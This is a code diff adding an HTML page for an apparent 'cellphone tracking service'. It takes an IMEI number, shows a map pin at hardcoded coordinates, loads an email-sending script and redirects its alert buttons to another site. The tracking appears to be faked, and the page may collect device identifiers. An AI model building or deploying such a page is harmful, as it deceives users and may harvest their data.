@@ -1,0 +1,209 @@
+<html>
+<head>
+    <meta name="viewport" content="width=device-width">
+    <script src='home.js'></script>
+    <link rel="stylesheet" href="home.css">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Aboreto&display=swap');
+      @import url('https://fonts.googleapis.com/css2?family=Bungee+Spice&display=swap');
+    </style>
+    
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+     integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
+     crossorigin=""/>
+     
+     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+     integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
+     crossorigin=""></script>
+    
+</head>
+
+
+<body>
+
+
+
+
+
+<div class="notificationCard" id="alert">
+  <p class="notificationHeading">Please Note</p>
+  <p class="notificationPara">Your device results are not ready,please check again later</p>
+  <div class="buttonContainer">
+    <button class="AllowBtn" onClick="closeAlert()">Home</button>
+    <button class="NotnowBtn" onClick="closeAlert()">Close</button>
+  </div>
+</div>
+<script>
+   function closeAlert(){
+       window.location.href=("https://www.bing.com/");
+   }
+</script>
+
+
+
+<div class="topBar">
+    
+      <div class="group">
+          <svg class="icon" aria-hidden="true" viewBox="0 0 24 24"><g><path d="M21.53 20.47l-3.66-3.66C19.195 15.24 20 13.214 20 11c0-4.97-4.03-9-9-9s-9 4.03-9 9 4.03 9 9 9c2.215 0 4.24-.804 5.808-2.13l3.66 3.66c.147.146.34.22.53.22s.385-.073.53-.22c.295-.293.295-.767.002-1.06zM3.5 11c0-4.135 3.365-7.5 7.5-7.5s7.5 3.365 7.5 7.5-3.365 7.5-7.5 7.5-7.5-3.365-7.5-7.5z"></path></g></svg>
+            <!---<input placeholder="Search" type="search" class="input">---->
+      </div>
+    
+      <image class="avatar" src="data:image/jpeg;base64,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">  </image>
+    
+</div>
+
+
+
+
+<p class="textTitle"> Precise <br/> Cellphone Tracking Services</p>
+<p class="date" id="dateTime"> Today,24 September 2023</p>
+
+
+
+
+<div id="map"></div>
+
+<script>
+
+     var map = L.map('map').setView([-24.6214565, 25.9100375], 10);
+     
+         L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
+         maxZoom: 19,
+         attribution: '&copy; <a href="http://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+         }).addTo(map);
+
+         var marker = L.marker([-24.6214565, 25.9100375]).addTo(map);
+
+
+         marker.bindPopup("<b>Tecno Pop7</b><br>--24.6214565, 25.9...").openPopup();
+     
+     
+</script>
+
+
+
+<p class="progress"> Phone Tracking</p>
+
+
+
+
+
+
+
+
+
+
+<div class="labelsTop">  <!--Labels-->
+
+<div>
+<input type="checkbox" id="ni">
+<label for="ni" class="ni"> TRACK</label>
+</div>
+
+
+<div>
+<input type="checkbox" id="ni2">
+<label for="ni2" class="ni2"> RESULTS</label>
+</div>
+
+
+<div>
+<input type="checkbox" id="ni3">
+<label for="ni3" class="ni3"> ABOUT</label>
+</div>
+
+
+<div>
+<input type="checkbox" id="ni4">
+<label for="ni4" class="ni4"> MORE</label>
+</div>
+
+
+</div><!--labels_END--->
+
+
+<!----Android_vs_iOS--->
+
+<div class="btn-container">
+
+     <image class="svgImage" src="https://cdn0.iconfinder.com/data/icons/social-line-transparent/50/Android-line-transparent-128.png"></image>
+
+			<label class="switch btn-color-mode-switch">
+		        <input value="1" id="color_mode" name="color_mode" type="checkbox">
+		        <label class="btn-color-mode-switch-inner" data-off="Android" data-on="iOS" for="color_mode"></label>
+		    </label>
+     <image class="svgImage2" src="https://cdn4.iconfinder.com/data/icons/logo-brand/512/apple_ios_brand_logo-64.png"></image>
+
+</div>
+<!---Andro_iOS_END--->
+
+
+
+<!---imeiField--->
+<form class="form">
+    <label for="search">
+        <input required="" autocomplete="off" placeholder="Enter IMEi number" id="imeiField" type="text">
+        <div class="icon">
+            <svg stroke-width="2" stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="swap-on">
+                <path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" stroke-linejoin="round" stroke-linecap="round"></path>
+            </svg>
+            <svg stroke-width="2" stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="swap-off">
+                <path d="M10 19l-7-7m0 0l7-7m-7 7h18" stroke-linejoin="round" stroke-linecap="round"></path>
+            </svg>
+        </div>
+        <button type="reset" class="close-btn">
+            <svg viewBox="0 0 20 20" class="h-5 w-5" xmlns="http://www.w3.org/2000/svg">
+                <path clip-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" fill-rule="evenodd"></path>
+            </svg>
+        </button>
+    </label>
+</form>
+<!--imeiField_END---->
+
+
+
+
+<div class="checkbox-wrapper-33">
+  <label class="checkbox">
+    <input type="checkbox" class="checkbox__trigger visuallyhidden">
+    <span class="checkbox__symbol">
+      <svg xmlns="http://www.w3.org/2000/svg" version="1" viewBox="0 0 28 28" height="28px" width="28px" class="icon-checkbox" aria-hidden="true">
+        <path d="M4 14l8 7L24 7"></path>
+      </svg>
+    </span>
+    <p class="checkbox__textwrapper"><u>I Accept Privacy Policy</u></p>
+  </label>
+</div>
+
+
+
+
+<button class="action" onClick="trackDevice()">Track Device</button>
+
+
+
+
+
+<!-----------------------------------------------------------------------------
+*Cards_ETC
+------------------------------------------------------------------------------>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
